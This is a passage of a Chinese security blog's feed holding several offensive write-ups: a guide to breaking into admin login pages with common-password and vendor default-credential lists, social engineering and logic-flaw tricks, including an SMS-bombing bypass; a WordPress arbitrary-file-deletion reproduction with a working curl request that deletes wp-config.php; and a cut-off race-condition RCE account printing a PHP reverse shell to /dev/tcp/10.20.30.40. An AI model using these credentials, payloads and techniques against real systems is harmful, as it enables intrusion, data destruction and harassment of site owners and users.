class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">次数 密码</span><br><span class="line">392 123456</span><br><span class="line">281 a123456</span><br><span class="line">165 123456a</span><br><span class="line">161 5201314</span><br><span class="line">157 111111</span><br><span class="line">136 woaini1314</span><br><span class="line"> 98 qq123456</span><br><span class="line"> 98 123123</span><br><span class="line"> 97 000000</span><br><span class="line"> 93 1qaz2wsx</span><br><span class="line"> 83 1q2w3e4r</span><br><span class="line"> 80 qwe123</span><br><span class="line"> 76 7758521</span><br><span class="line"> 68 123qwe</span><br><span class="line"> 63 a123123</span><br><span class="line"> 56 woaini520</span><br><span class="line"> 55 123456aa</span><br><span class="line"> 52 1314520</span><br><span class="line"> 52 100200</span><br><span class="line"> 51 woaini</span><br><span class="line"> 50 woaini123</span><br><span class="line"> 50 123321</span><br><span class="line"> 49 q123456</span><br><span class="line"> 49 123456789</span><br><span class="line"> 48 asd123</span><br><span class="line"> 48 a123456789</span><br><span class="line"> 48 5211314</span><br><span class="line"> 48 123456789a</span><br><span class="line"> 47 z123456</span><br><span class="line"> 47 asd123456</span><br><span class="line"> 45 a5201314</span><br><span class="line"> 42 zhang123</span><br><span class="line"> 41 aa123456</span><br><span class="line"> 40 123123a</span><br><span class="line"> 38 aptx4869</span><br><span class="line"> 37 1qazxsw2</span><br><span class="line"> 37 1q2w3e4r5t</span><br><span class="line"> 36 5201314a</span><br><span class="line"> 35 aini1314</span><br><span class="line"> 35 1q2w3e</span><br><span class="line"> 34 woaini521</span><br><span class="line"> 34 q1w2e3r4</span><br><span class="line"> 34 31415926</span><br><span class="line"> 34 123456qq</span><br><span class="line"> 33 a111111</span><br><span class="line"> 33 520520</span><br><span class="line"> 33 1234qwer</span><br><span class="line"> 29 123456abc</span><br><span class="line"> 29 111111a</span><br><span class="line"> 29 110110</span><br><span class="line"> 28 w123456</span><br><span class="line"> 28 abc123</span><br><span class="line"> 28 7758258</span><br><span class="line"> 26 iloveyou</span><br><span class="line"> 26 159753</span><br><span class="line"> 25 qwer1234</span><br><span class="line"> 25 a000000</span><br><span class="line"> 24 zxc123</span><br><span class="line"> 24 123qweasd</span><br><span class="line"> 24 123654</span><br><span class="line"> 23 qq123123</span><br><span class="line"> 23 abc123456</span><br><span class="line"> 23 123456q</span><br><span class="line"> 22 qq5201314</span><br><span class="line"> 22 12345678</span><br><span class="line"> 21 456852</span><br><span class="line"> 21 000000a</span><br><span class="line"> 20 1314521</span><br><span class="line"> 19 zxc123456</span><br><span class="line"> 19 asdasd</span><br><span class="line"> 19 as123456</span><br><span class="line"> 19 666666</span><br><span class="line"> 19 521521</span><br><span class="line"> 19 112233</span><br><span class="line"> 18 q1w2e3</span><br><span class="line"> 18 abcd1234</span><br><span class="line"> 18 aaa123</span><br><span class="line"> 17 qazwsx123</span><br><span class="line"> 17 qaz123</span><br><span class="line"> 17 aaaaaa</span><br><span class="line"> 17 a123321</span><br><span class="line"> 17 12qwaszx</span><br><span class="line"> 17 123000</span><br><span class="line"> 17 11111111</span><br><span class="line"> 16 zxcvbnm123</span><br><span class="line"> 16 wang123</span><br><span class="line"> 16 s123456</span><br><span class="line"> 16 nihao123</span><br><span class="line"> 16 love1314</span><br><span class="line"> 16 caonima123</span><br><span class="line"> 16 asdasd123</span><br><span class="line"> 16 753951</span><br><span class="line"> 16 5845201314</span><br><span class="line"> 16 584520</span><br><span class="line"> 16 159357</span><br><span class="line"> 16 147258</span><br><span class="line"> 16 1123581321</span><br><span class="line"> 16 110120</span><br><span class="line"> 15 hao123</span><br><span class="line"> 15 a7758521</span><br></pre></td></tr></table></figure></p><p><strong>遇到网络设备，基本像交换机、路由器、安全设备之类的，可以尝试一下默认密码</strong></p><p>网上找到的，但忘了是哪个大佬发的了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119</span><br><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）</span><br><span class="line">登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666</span><br><span class="line">深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251</span><br><span class="line">https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430</span><br><span class="line">启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766</span><br><span class="line">https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900</span><br><span class="line">juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen</span><br><span class="line">Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco</span><br><span class="line">Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123</span><br><span class="line">H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430</span><br><span class="line">绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效</span><br><span class="line">网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220</span><br><span class="line">深信服VPN： 51111端口 delanrecover</span><br><span class="line">华为VPN：账号：root 密码：mduadmin</span><br><span class="line">华为防火墙： admin Admin@123 eudemon</span><br><span class="line">eudemon Juniper防火墙： netscreen netscreen</span><br><span class="line">迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</span><br><span class="line">山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</span><br><span class="line">安恒的明御防火墙 admin/adminadmin</span><br><span class="line">某堡垒机 shterm/shterm</span><br><span class="line">天融信的vpn test/123456</span><br></pre></td></tr></table></figure></p><h2 id="0x06-社工"><a href="#0x06-社工" class="headerlink" title="0x06 社工"></a>0x06 社工</h2><p>在我看来社工是很牛逼的一种攻击方式，有时可以四两拨千斤。</p><p>像教育站，登陆账号可能是学号，密码是身份证后六位。百度查xxx学校一卡通丢失，一般就能从某学生的失物启示找到学号。</p><p>或者在文章标题下，若存在作者名字，可能就是用户名<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti8jhd44j30r403mwg4.jpg" alt><br>密码除结合管理员电话，qq，姓名等外，还可注意下网站的一些关键词。曾挖过一个弱口令漏洞，密码是网站域名+123，都不用生成字典就进后台了。</p><p>最近刚好参加某省护网，讲个例子：对某系统爆破admin用户的密码没成功，于是在联系我们处找到了管理员的一些信息，想生成社工字典试下运气。</p><p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti8y4ebkj30rc0dhdg0.jpg" alt></p><p>本想直接用社工密码生成工具生成字典爆破一下的，但突然想到注册处可以遍历用户名是否存在</p><p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti9fkjngj315a0ao406.jpg" alt></p><p>于是结合社工尝试几个账号，发现联系我们处的管理员的账号是姓氏首字母加名字全拼，然后一爆破，密码123456直接进去后台。并在后台的搜索处发现Sql注入，再用sqlmap神器的命令 —os-shell成功打开xpcmdshell，拿到系统权限。</p><p>社工密码字典生成,怕麻烦的可使用在线网站生成：<a href="http://tools.mayter.cn/" target="_blank" rel="noopener">http://tools.mayter.cn/</a><br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiarmsq2j30tw0h5my0.jpg" alt></p><p>也可使用cupp这款工具，这是一款交互式的工具，使用比较简单</p><p>地址：<a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></p><p><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6tibbbjjoj30tp0eogvv.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tibo6uqfj30ug04m42p.jpg" alt></p><p>看看生成的密码：<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tic28hgzj30nk0ekn58.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6ticex24vj30q90cq10e.jpg" alt></p><p>另一款是cewl，它通过爬行网站获取关键信息创建一个密码字典。</p><p>但我用了下，感觉生成的字典比较多冗余信息，很多关联不大的汉字都包含在字典中，个人觉得不是特别好用。</p><p>还有最近freebuf看了一篇文章，才发现hashcat这款爆破工具也能生成社工字典，感兴趣的朋友也可以去试试。</p><p>0x07 逻辑漏洞<br>逻辑漏洞是由于一些程序员未考虑到或者为贪图省事，而造成的逻辑上的漏洞，一般waf不容易拦截，因此和弱口令漏洞都是现在相对容易挖掘的一类漏洞。逻辑漏洞种类十分丰富，这里讲登陆框的逻辑漏洞，主要介绍一些技巧给大家拓宽一下思路，讲的不全请见谅。更详细的漏洞细节大家可以在网上查找资源（绝不是因为我懒）。</p><p>注册与忘记密码模块<br>云短信接受平台</p><p>相信有些朋友在测试注册模块的时候，会使用自己的手机号，而这就带来隐患：信息泄露，和短信骚扰。</p><p>这里给大家提供两个短信接受平台，让大家免去烦恼：</p><p><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">https://www.pdflibr.com/</a><br><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">http://www.smszk.com/</a></p><p><strong>遍历已注册用户</strong></p><p>这个上面的社工例子有讲，可查到用户是否存在。<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tid3lj8rj30tx07ht9m.jpg" alt></p><p>**任意用户注册</p><p>注册用户不需验证码认证即可注册成功的情况下，可使用工具发包，恶意批量注册用户。</p><p><strong>修改发送包邮箱尝试覆盖注册</strong></p><p>注册时显示某用户已注册；<br>在注册新用户时抓包，更改自己的账号信息为admin用户；<br>可能可以覆盖admin用户，重新注册成功。<br>任意密码重置</p><p>修改密码时使用其他人的手机号，可抓包更改成自己的手机号。自己手机收到验证信息并输入，可更改他人密码成功。</p><p><strong>跳过验证</strong></p><p>跳过验证步骤、找回方式，直接到设置新密码页面</p><p>这里直接用乌云的例子说明应该就懂了。</p><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-098765.html" target="_blank" rel="noopener">中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷</a></p><p><strong>短信轰炸</strong></p><p>短信轰炸，一般人可能抓包重放失败后就放弃了。这里有个技巧，</p><p>是从西门吹雪师傅博文里学到的绕过的姿势：</p><p>发送短信处一般每隔60秒才能发送一次<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tidgpb01j30tt0czdip.jpg" alt></p><p>但若是发包时在手机号后加上一个空格、加号或换行符等特殊字符。然后重新发送，这时若发送成功，则说明可绕过限制。</p><p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tidx88r2j30uc0fo41a.jpg" alt></p><p>此时在intruder模块只要持续递增空格就可造成无限短信轰炸</p><p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiebp2jmj30sw0nyk2v.jpg" alt><br><a href="http://ximcx.cn/post-143.html" target="_blank" rel="noopener">博文链接</a></p><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p><strong>越权访问目录</strong></p><p>可越权访问到后台路径，网站组件配置文件，备份文件等，当然扫目录字典也要好。</p><p><strong>修改身份标识</strong></p><p>更改成功登陆的用户的身份标识，可能就能越权访问到其他用户的页面。</p><p>例如：1、本人之前曾用test用户弱口令漏洞登陆成功，然后更改参数越权访问到admin用户；2、曾看过一漏洞：用户认证的token值是用户名加时间戳的md5值，而恰好数据包某处就有返回用户名加时间戳，然后更改时间戳前的用户名，md5后加在token上成功越权到其他用户上（这种漏洞一般需要细心查找登陆时身份认证参数的规律）</p><p>之前的任意密码重置等漏洞，其实也是修改用户身份标识，系统认证机制不完善导致漏洞出现。</p><p><strong>抓返回包</strong></p><p>在登陆时返回包可能返回用户敏感信息，此时改一改参数说不定还能越权查到其他用户信息。</p><p>或注册、找回密码发送短信邮箱时，可能直接返回验证码等</p><p>在返回包里，更改下参数为true、success、1，可能就能未授权进入后台</p><p>1登陆抓包，点击右键，抓取返回包<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiepy71tj30th0b70u7.jpg" alt><br>2观察返回的参数<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tif4gp1bj30kl08e3z8.jpg" alt><br>3更改参数<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6tiffyxc3j30gi07o750.jpg" alt><br>4成功进入后台</p><p><strong>禁用js</strong></p><p>曾经碰到过一个站点，能未登陆访问后台首页，但再次点击就会退出到登陆页面。此时禁用js，然后成功访问部分功能模块，成功利用文件上传拿到webshell。</p><p>因为有些网站的Url跳转是由前端js控制，这时禁用js后说不定就能成功访问。</p><p>下面是火狐的一个禁用js的插件<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tifsq9hbj30tq05vt92.jpg" alt></p><h2 id="0x08-看网站源码信息"><a href="#0x08-看网站源码信息" class="headerlink" title="0x08 看网站源码信息"></a>0x08 看网站源码信息</h2><p>当你思路枯竭的时候不妨看看源码，它是一块宝藏，说不定就能在里面发现惊喜。有些程序员会把后台的功能链接放在前端源码中,说不定就存在未授权访问，甚至有些奇葩程序员在前端代码存放测试的账号密码。</p><p>首先给大家推荐一款工具，很强大：JSFinder</p><p>链接：<a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p><p>这是一款在网站的js文件中提取URL，子域名的工具，用在后台登陆界面抓取一些敏感的js文件效果也很不错，我曾用它抓取过网站后台的一个插件源码，后台的功能链接，敏感信息，接口链接（存在xss，注入）等等。我同学还说过burp也有抓js的插件，但可惜我没找到，用这款也差不多够用了。</p><p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tig6pniuj30tw0irte6.jpg" alt></p><p>这里讲一下乌云的一个案例，具体链接忘记了，就讲一下思路：</p><p>洞主之前发现了一个漏洞，提交后，等过一段时间再去瞧下那个站，发现系统大变样，连url的路径都改了，已经修复了吗？</p><p>但是当洞主右键查看源代码时，发现还保留着之前旧系统的链接和代码，有的只是注释了而已，关键是漏洞竟然还没修？！tql，这种开发建议直接祭天。</p><p>看js代码，甚至一些图片的链接，说不定就有一番意外的收获。比如R3start大佬的一篇博文中讲的就很精彩从JS信息泄露到Webshell</p><p>文章的思路是：</p><p>作者进行渗透时，在一个图片链接中发现了一个三级子域名，删掉URl、直接访问根路径发现了一个title是某管理平台的页面。</p><p>但页面无法正常加载，故进行目录扫描得到后台地址和后台js压缩包，然后在源码的某处JS代码中发现了多个可登录的账号。</p><p>尝试弱口令无果后，从js压缩包查到了默认密码规则。成功登陆一个普通用户，但发现权限并不大。</p><p>然后通过js代码寻找获取到了别的接口地址，发现存在越权漏洞，通过JS接口越权访问到活动管理页面获取到管理员的登陆账号。</p><p>最后找上传点，抓包改后缀拿shell一气呵成。</p><p>引用R3start师傅的一句话：</p><p>右键查看JS源码，你可能会发现… 被注释的账号密码、接口、token、真实IP、开发环境…. 永远不知道程序员在JS中给你留下了什么样的惊喜。</p><h2 id="0x09-总结"><a href="#0x09-总结" class="headerlink" title="0x09 总结"></a>0x09 总结</h2><p>上面的内容比较杂，篇幅也比较长，所以有些地方就没有展开来讲。有些地方可能讲得比较简略模糊，请大家见谅，如果有疑惑可以联系我。</p><p>顺便说下感想：</p><p>这段时间的安服实习对我带来很大的帮助，面对一些系统目标固定，不能横向渗透。C段、端口扫描、子域名挖掘等信息收集都做不了，只能硬着头皮怼目标。而做安全服务经常碰到的就是后台登陆界面，怼着怼着就成长了，毕竟孰能生巧。</p><p>虽然渗透比较艰难，但也培养了我的漏洞挖掘能力。反思下自己以前挖漏洞，都是走马观花，面对信息收集来的一大堆资产，都是随便测下就结束，并没有深入且细心地去寻找漏洞，导致之前的SRC挖掘之旅十分困难。因此希望新手在挖洞时能够更加细心，特别是挖掘SRC时，有时就得花时间一个参数一个参数去”怼”，才能有所收获。要相信，大力出奇迹！</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>最新版wordpress任意文件删除漏洞复现</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E6%9C%80%E6%96%B0%E7%89%88wordpress%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E6%9C%80%E6%96%B0%E7%89%88wordpress%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在推特上看到了一篇paper，<a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="noopener">点我啊</a></p><p>wp很久没看到洞了，这个漏洞七个月之前就上报了</p><p><img src="https://www.t00ls.net/attachments/month_1806/1806271941e0c68c6590fb61ce.jpg" alt></p><p>可以直接利用删除图片那个功能删除网站配置文件，导致网站只能重装。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>这是我下载的最新版wordpress(4.9.6)</p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719418e1d18c525441003.jpg" alt></p><p>登陆后台：</p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719417422f20751eeb517.jpg" alt></p><p>上传张图片：</p><p><img src="https://www.t00ls.net/attachments/month_1806/1806271941c262f1600ee929f9.jpg" alt><br><img src="https://www.t00ls.net/attachments/month_1806/18062719417ba7d799ffd03dac.jpg" alt></p><p>然后edit</p><p>发挥一下Curl的作用。<br>执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://192.168.19.129/wordpress/wp-admin/post.php?post=7&apos; -H &apos;Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=wing%7C1531306971%7CZycd9e4B1COvm6oKBWF2SlMfqWu2u0xTG85eAD4giBx%7C099559ea1580b258b82765641ac85a51576507c8c3ebb8e131b20c9eec8f65bc; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=wing%7C1531306971%7CZycd9e4B1COvm6oKBWF2SlMfqWu2u0xTG85eAD4giBx%7Cba9defabde03b6acdb4a5c43fc39244efbec15913483ae43ff0b624be552f5a4; wp-settings-time-1=1530097413&apos; -d &apos;action=editattachment&amp;_wpnonce=28380b3d4a&amp;thumb=../../../../wp-config.php&apos;</span><br></pre></td></tr></table></figure><p>这里把里面的cookie和_wpnonce还有post的值换成你的。</p><p>_wpnonce在页面中：</p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719416e3066a6bbbff35a.jpg" alt></p><p><img src="https://www.t00ls.net/attachments/month_1806/180627194156de439440ffd6f8.jpg" alt></p><p>302跳转说明编辑成功。<br><img src="https://www.t00ls.net/attachments/month_1806/1806271941fac9a1bd5595aff2.jpg" alt></p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719414486ac7e14bbfe0e.jpg" alt></p><p>现在点击Delete Permanently即可。<br><img src="https://www.t00ls.net/attachments/month_1806/18062719410de6e321efa45d83.jpg" alt></p><p><img src="https://www.t00ls.net/attachments/month_1806/18062719417bd0b5cc4ef818d3.jpg" alt></p><p>配置文件成功删除。</p><p>漏洞原理作者博客上有细节，本意是删除缩略图。但是没有对路径做限制，导致可以任意文件删除。</p><p>作者给的修复代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add_filter( &apos;wp_update_attachment_metadata&apos;, &apos;rips_unlink_tempfix&apos; );</span><br><span class="line"></span><br><span class="line">function rips_unlink_tempfix( $data ) &#123;</span><br><span class="line">    if( isset($data[&apos;thumb&apos;]) ) &#123;</span><br><span class="line">        $data[&apos;thumb&apos;] = basename($data[&apos;thumb&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Sakura"><a href="#Sakura" class="headerlink" title="Sakura"></a>Sakura</h2><p>鸡肋之处在于需要管理员权限，但是危害蛮大的。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>利用竞争条件（Race Condition）对目标Web应用实现RCE</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E5%88%A9%E7%94%A8%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%EF%BC%88Race%20Condition%EF%BC%89%E5%AF%B9%E7%9B%AE%E6%A0%87Web%E5%BA%94%E7%94%A8%E5%AE%9E%E7%8E%B0RCE/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E5%88%A9%E7%94%A8%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%EF%BC%88Race%20Condition%EF%BC%89%E5%AF%B9%E7%9B%AE%E6%A0%87Web%E5%BA%94%E7%94%A8%E5%AE%9E%E7%8E%B0RCE/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.3001.net/images/20190927/1569574102_5d8dccd6280d4.jpeg" alt><br><strong>本文讲述了作者在某邀请测试项目中，通过对SQL注入和竞争条件（Race Condition）的组合利用，利用上传文件到服务器和服务器转移上传文件到Amazon S3的时间差，最终实现了对目标应用的RCE漏洞。由于该RCE漏洞的发现相对独特，所以作者在本文中着重从竞争条件（Race Condition）的触发机制说起，和大家分享。</strong></p><p>竞争条件（Race Condition）：计算机运行过程中，并发、无序、大量的进程在使用有限、独占、不可抢占的资源，由于进程无限，资源有限，产生矛盾，这种矛盾称为竞争（Race）。竞争条件（Race Condition）旨在描述一个系统或者进程的输出依赖于不受控制的事件出现顺序或者出现时机。由于两个或者多个进程竞争使用不能被同时访问的资源，使得这些进程有可能因为时间上推进的先后原因而出现问题。</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><strong>第一个上传功能点upload.php</strong><br>这里的前提是，我已经通过SQL注入获取到了目标Web应用的管理员账户凭据，然后登录到其内部管理界面后，我发现可通过该管理面板中的upload.php功能发布新闻或文章：<br><img src="https://image.3001.net/images/20190927/1569573792_5d8dcba09f119.png" alt></p><p>没做太多考虑，我就直接通过upload.php尝试上传了一个.php文件shell，但问题是该上传功能限制了对.php格式文件的上传，在变化.PhP、.php3、phpphp、空字符等形式的绕过方法后，还是不行：</p><p><img src="https://image.3001.net/images/20190927/1569573819_5d8dcbbb2d374.png" alt></p><p>然后，我想到了存储型XSS，能不能通过上传 .html、.xml或.svg格式文件呢？这一下上传总算成功了，但是，由于目标Web应用又会把用户上传文件转储到云端的S3存储桶中去，那在S3存储桶触发XSS也没意义了。好吧，那暂时把这个问题放一边，来看其它的。</p><p><strong>第二个上传功能点modify.php</strong><br>在没有头绪之时，我又返回管理面板中“news”栏目，想看看能不能在添加或编辑操作中发现可利用的点。此时，我注意到了“edit”功能，如下在这个非法上传文件右上端，我点击了其“edit”按钮：<br><img src="https://image.3001.net/images/20190927/1569573846_5d8dcbd6be03b.png" alt></p><p>然后跳出了以下包含upload to replacing the file的窗口：</p><p><img src="https://image.3001.net/images/20190927/1569573860_5d8dcbe4d0c4f.png" alt></p><p>我想到的是，它可能也是包含了限制过滤条件吧，但事实是，它没有任何后缀格式限制条件！可以上传任意文件！那就上传吧，如果没有限制条件的话，那它调用的应该不是之前的upload.php，确实是，它调用了另一上传功能点“modify.php”，以下是它的调用请求格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;fileid&quot;</span><br><span class="line"></span><br><span class="line">31337</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">picture-1.png</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;description&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;reverse.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">exec(&quot;/bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.20.30.40/21234 0&gt;&amp;1&apos;&quot;);</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;save&quot;</span><br><span class="line"></span><br><span class="line">Save</span><br></pre></td></tr></table></figure><p>大功告成了吗？并没有。目标Web应用之后还会把用户上传文件转储上传到云端S3存储桶中去，也就是说，如果被传到S3中去，在目标Web应用的服务器中，我们也没shell可反弹了。</p><p>竞争条件（Race Condition）响应错误获得本地文件路径</p><p>此时，毫无头绪之际，我通过burpsuite的 intruder 模式上传操作中，发现了响应长度的异常。有时候需要发起10个左右的请求，有时候则需要发起20–30个请求，才会出现这样的响应异常。正常来说，多数请求的响应长度为1147，但奇怪的是，在其中，会夹杂着长度为1710的响应。如多次上传空内容的rc.php，其请求样式为：</p><p><img src="https://image.3001.net/images/20190927/1569573928_5d8dcc28ae8c9.png" alt></p><p>以下是正常的长度为1147的响应：<br><img src="https://image.3001.net/images/20190929/15697498189460.png" alt></p><p>以下则是异常的长度为1710的响应，其中竟然返回了我们上传的php文件的本地路径：<br><img src="https://image.3001.net/images/20190929/15697498457248.png" alt></p><p>本想着，有了这个路径，那么完全就可以实现监听反弹了，但其实不然。当我通过浏览器访问该上传php文件后，Web应用返回了“File not Found”的提示，经再次检查后发现，该文件路径已经对应成了S3存储桶的路径了，所以，因此我猜测，我们的上传文件被目标Web应用移动到云端S3之前，在Web应用服务器中保存的时间大概会是短暂的1到2秒。</p><h4 id="用竞争条件（Race-Condition）反弹Shell并实现RCE"><a href="#用竞争条件（Race-Condition）反弹Shell并实现RCE" class="headerlink" title="用竞争条件（Race Condition）反弹Shell并实现RCE"></a>用竞争条件（Race Condition）反弹Shell并实现RCE</h4><p>根据以上的时间猜测，我就有一个想法：如果我们从客户端来触发竞争条件，通过浏览器反复请求上传文件路径，以此来争取对其的访问占有权限，这样的做法是否可行？</p><p>也就是：</p><p>在我们shell反弹服务器中设置端口监听 -&gt; 上传我们的反弹shell文件 -&gt; 发起多个请求执行竞争条件 -&gt; 获取长度异常的响应 